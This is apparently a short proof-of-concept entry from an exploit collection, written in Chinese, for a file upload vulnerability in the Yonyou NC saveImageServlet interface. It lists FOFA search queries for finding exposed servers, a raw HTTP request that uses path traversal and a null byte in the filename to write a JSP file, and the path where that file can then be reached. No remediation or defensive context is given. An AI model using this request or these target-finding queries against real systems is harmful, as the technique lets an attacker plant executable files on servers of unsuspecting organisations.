## 用友NC_saveImageServlet接口存在文件上传漏洞


## fofa
```
icon_hash="1085941792"  
app="用友-UFIDA-NC"
```

## poc
```
POST /portal/pt/servlet/saveImageServlet/doPost?pageId=login&filename=../1.jsp%00 HTTP/1.1
Host: 
Content-Type: application/octet-stream
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 19

111
```

文件路径`http://ip:port/portal/processxml/1.jsp`

![image](https://github.com/wy876/POC/assets/139549762/be012248-101f-4491-863e-4e71c5312ce4)

![image](https://github.com/wy876/POC/assets/139549762/38da1f69-fe44-4cad-b663-b9dfd632d7dd)


